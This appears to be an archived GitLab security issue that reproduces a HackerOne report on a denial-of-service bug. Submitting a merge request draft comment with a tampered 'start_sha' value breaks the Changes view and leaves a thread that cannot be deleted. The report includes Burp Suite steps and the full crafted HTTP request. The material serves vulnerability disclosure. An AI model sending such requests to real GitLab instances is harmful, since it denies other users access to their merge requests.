=== Content from gitlab.com_139fddba_20250111_150714.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Invalid 'start\_sha' value in POST `/{group}/{project}/-/merge\_requests/{id}/drafts` when comment on merge requests leads to changes unable to load

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2058514](https://hackerone.com/reports/2058514)** by `toukakirishima` on 2023-07-09, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I found a DOS vulnerability when comment on file merge requests (on the *Changes* menu). I noticed if **start\_sha** is not validated first it causes DOS (user can't load file on *Changes* menu and cant delete the thread).

Normally you can delete threads that you have created.

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/92ce056290f2a349c584c00e44a37646edfe7a9d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38363032323432332d326232332d343932642d383332392d6263383066383833353439652f67616d6261722e706e67)

And can load files on *Changes* menu.

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/fa78a68ddc0d79f0882dad6865ffb27001b90261/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666135313834382d626630352d346631382d393532382d6564373132343032396432322f67616d6261722e706e67)

But as an attacker I can make the victim unable to load file on *Changes* menu and cant delete the thread. Even admin can't delete thread.

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3033f57cecab3ace8f68f8401115d195e097eb92/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63633438643764372d643830632d346636312d383639652d6135313539626439373634632f67616d6261722e706e67)

[![Screenshot_10.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f3962af3169e01574af2a6eddb5978cc534bde16/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35333234303265382d616138332d343231342d626365382d3131373662363833636532392f53637265656e73686f745f31302e706e67)

Let's say Touka Attacker is the attacker and Touka Kirishima is the victim.

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/93a7d1cca9399cce389a2a228f6ee2fb5c0891f6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39646139323264372d373661642d346231612d383033392d6264383735323433623266642f67616d6261722e706e67)

And Touka Kirishima (victim) made Merge requests.

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/e4cfbddc55bdb38ff276f08a48eb1c263cfa1adf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39636565373937352d383365312d343933352d613138342d3238623535306666363332612f67616d6261722e706e67)

##### Steps to reproduce

1. Go to merge requests

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/58a4eca67ba45f15b2416d37964b3e712b389cec/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30303865626331352d613634612d346533632d613634312d6136303039643835666634372f67616d6261722e706e67)

2. Go to *Changes* menu

[![Screenshot_12.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/e36227b9054ff15aeef5c1dbba2b30f42d584a2a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65366534363932332d353533392d343563372d383164622d3937636531633039313037362f53637265656e73686f745f31322e706e67)

3. Comment on this file

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/25b63b89b19d4b7ded653ecd208388bf9954fcb6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30313839393866632d346234632d343462612d623033662d3562393836626561323030362f67616d6261722e706e67)

4. Click Start a review and makesure burpsuite is on. You will see request like following, Example :

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/6ddddef9ba42005d235104ba9bd601be7657f5d1/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61343139633239332d383164372d343366392d383034392d6637383233346639386164612f67616d6261722e706e67)

```
POST /toukak/aaaa/-/merge_requests/4/drafts HTTP/2
Host: gitlab.com
Cookie: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://gitlab.com/toukak/aaaa/-/merge_requests/4/diffs
X-Csrf-Token: x
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Content-Length: 707
Origin: https://gitlab.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"line_type":"old","merge_request_diff_head_sha":"d5d27e5e75cb66f567f39c7fe8ea2daea67f03a9","in_reply_to_discussion_id":"","note_project_id":"","target_type":"merge_request","target_id":235434679,"return_discussion":true,"draft_note":{"note":"Hehe","position":"{\"base_sha\":\"fe0ced6306a3fe0b992d2c4a9204169c1538279f\",\"start_sha\":\"fe0ced6306a3fe0b992d2c4a9204169c1538279f\",\"head_sha\":\"d5d27e5e75cb66f567f39c7fe8ea2daea67f03a9\",\"old_path\":\"hehe\",\"new_path\":\"hehe\",\"position_type\":\"file\",\"old_line\":null,\"new_line\":null,\"line_range\":{},\"ignore_whitespace_change\":false}","noteable_type":"MergeRequest","noteable_id":235434679,"commit_id":null,"type":"DiffNote","line_code":null}}
```

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/5658a218afce6c48d1d2b7d44ab883ec0484bf95/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33356532303663642d306561332d346433312d623336392d3363383464626339303566612f67616d6261722e706e67)

5. Send to Repeater
6. Change *start\_sha*. Example :

```
POST /toukak/aaaa/-/merge_requests/4/drafts HTTP/2
Host: gitlab.com
Cookie: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://gitlab.com/toukak/aaaa/-/merge_requests/4/diffs
X-Csrf-Token: x
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Content-Length: 707
Origin: https://gitlab.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"line_type":"old","merge_request_diff_head_sha":"d5d27e5e75cb66f567f39c7fe8ea2daea67f03a9","in_reply_to_discussion_id":"","note_project_id":"","target_type":"merge_request","target_id":235434679,"return_discussion":true,"draft_note":{"note":"Hehe","position":"{\"base_sha\":\"fe0ced6306a3fe0b992d2c4a9204169c1538279f\",\"start_sha\":\"fe0ced6306a3fe0b992d2c4a9204169c15382791\",\"head_sha\":\"d5d27e5e75cb66f567f39c7fe8ea2daea67f03a9\",\"old_path\":\"hehe\",\"new_path\":\"hehe\",\"position_type\":\"file\",\"old_line\":null,\"new_line\":null,\"line_range\":{},\"ignore_whitespace_change\":false}","noteable_type":"MergeRequest","noteable_id":235434679,"commit_id":null,"type":"DiffNote","line_code":null}}
```

[![Screenshot_13.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/c4c4811380438129402b972dcffc9d13adda01e3/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34303961383930392d333962632d346537612d383865392d3439336130633031353764312f53637265656e73686f745f31332e706e67)

7. Click Send
8. Finish and Submit review

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/336b8253c15f9cdceb35184a8c70161f2144262c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34393638393061392d376163322d346262332d383730612d3663396238393465623733372f67616d6261722e706e67)

9. Reload the page and you unable to load file on *Changes* menu and cant delete the thread

**POV from Attacker**

[![gambar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/cdf7fa0e123b31ed0d0e66dc8ce642d62de920e4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62323330353732642d336239622d343038362d383765642d6235343138396138373262312f67616d6261722e706e67)

[![Screenshot_14.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f7daa9fcbade17012f35607e125238aa78390509/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38656463303439352d303035362d343737352d616637382d6662383163653564383334352f53637265656e73686f745f31342e706e67)

**POV from Victim**

[![Screenshot_15.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/c2c64760ade506c9554d454ba30bc54dfd29776d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65656630326565302d633761362d346362352d623462652d3435326530343166303834362f53637265656e73686f745f31352e706e67)

[![Screenshot_16.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/32d865e2fd51824040aac51a2e35ccf428e0a2ef/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36363562666536332d663761392d346665362d396163622d3632323866353638316663632f53637265656e73686f745f31362e706e67)

##### POC

[bandicam\_2023-07-09\_19-04-28-764.mp4](https://user-content.gitlab-static.net/ebf549a6a7ccf5eacd068023ee1ebc9521b09160/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31346230396564302d633261362d346539382d623733302d3266363335313962303230662f62616e646963616d5f323032332d30372d30395f31392d30342d32382d3736342e6d7034 "Download 'bandicam_2023-07-09_19-04-28-764.mp4'")

##### Relevant logs and/or screenshots

 `TypeError: this.discussion.diff_file is null diffViewerMode diff_with_note.vue:44 VueJS 3 get evaluate Gr isTextFile diff_with_note.vue:56 VueJS 3 get evaluate Gr U diff_with_note.vue:1 VueJS 52 _render r get t mount $mount init d d g d g d g d g d g d Lo _update r get t mount $mount init d d Lo _update r get t mount $mount init d d D E E E E Lo _update r get run mr Cn _n instrument.js:108:32 kt instrument.js:108 VueJS 55 mn gn pn _render r get t mount $mount init d d g d g d g d g d g d Lo _update r get t mount $mount init d d Lo _update r get t mount $mount init d d D E E E E Lo _update r get run mr Cn _n`

##### Output of checks

This bug happens on GitLab.com

#### Impact

* Attacker can make the victim unable to load file on *Changes* menu.
* Attacker can make the victim cant delete the thread. Even admin can't delete thread.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [gambar.png](https://h1.sec.gitlab.net/a/86022423-2b23-492d-8329-bc80f883549e/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/3fa51848-bf05-4f18-9528-ed7124029d22/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/cc48d7d7-d80c-4f61-869e-a5159bd9764c/gambar.png)
* [Screenshot\_10.png](https://h1.sec.gitlab.net/a/532402e8-aa83-4214-bce8-1176b683ce29/Screenshot_10.png)
* [gambar.png](https://h1.sec.gitlab.net/a/9da922d7-76ad-4b1a-8039-bd875243b2fd/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/9cee7975-83e1-4935-a184-28b550ff632a/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/008ebc15-a64a-4e3c-a641-a6009d85ff47/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/018998fc-4b4c-44ba-b03f-5b986bea2006/gambar.png)
* [Screenshot\_12.png](https://h1.sec.gitlab.net/a/e6e46923-5539-45c7-81db-97ce1c091076/Screenshot_12.png)
* [gambar.png](https://h1.sec.gitlab.net/a/a419c293-81d7-43f9-8049-f78234f98ada/gambar.png)
* [gambar.png](https://h1.sec.gitlab.net/a/35e206cd-0ea3-4d31-b369-3c84dbc905fa/gambar.png)
* [Screenshot\_13.png](https://h1.sec.gitlab.net/a/409a8909-39bc-4e7a-88e9-493a0c0157d1/Screenshot_13.png)
* [gambar.png](https://h1.sec.gitlab.net/a/b230572d-3b9b-4086-87ed-b54189a872b1/gambar.png)
* [Screenshot\_14.png](https://h1.sec.gitlab.net/a/8edc0495-0056-4775-af78-fb81ce5d8345/Screenshot_14.png)
* [Screenshot\_15.png](https://h1.sec.gitlab.net/a/eef02ee0-c7a6-4cb5-b4be-452e041f0846/Screenshot_15.png)
* [Screenshot\_16.png](https://h1.sec.gitlab.net/a/665bfe63-f7a9-4fe6-9acb-6228f5681fcc/Screenshot_16.png)
* [gambar.png](https://h1.sec.gitlab.net/a/496890a9-7ac2-4bb3-870a-6c9b894eb737/gambar.png)
* [bandicam\_2023-07-09\_19-04-28-764.mp4](https://h1.sec.gitlab.net/a/14b09ed0-c2a6-4e98-b730-2f63519b020f/bandicam_2023-07-09_19-04-28-764.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


